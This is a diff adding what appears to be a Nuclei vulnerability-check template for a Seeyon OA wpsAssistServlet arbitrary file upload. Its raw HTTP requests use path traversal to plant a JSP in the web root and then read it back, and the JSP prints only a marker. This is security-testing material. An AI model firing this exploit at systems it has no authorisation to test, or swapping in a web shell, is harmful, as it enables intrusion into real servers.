@@ -1,0 +1,41 @@
+id: seeyon-wpsassist-upload
+
+info:
+  name: Seeyon wpsAssistServlet Arbitrary File Upload
+  author: local
+  severity: high
+  description: Uploads a random marker file and reads it back. It may leave a temporary JSP if the target cannot remove it.
+  tags: seeyon,zhiyuan,file-upload,active,intrusive
+
+variables:
+  filename: "{{rand_base(10)}}"
+  marker: "{{rand_base(20)}}"
+  boundary: "{{rand_base(12)}}"
+
+http:
+  - raw:
+      - |
+        POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{filename}}.jsp&fileId=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="upload"; filename="probe.xls"
+        Content-Type: application/vnd.ms-excel
+
+        <% out.println("{{marker}}"); %>
+        --{{boundary}}--
+      - |
+        GET /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "officeTransResultFlag")'
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "{{marker}}")'
+        condition: and
+
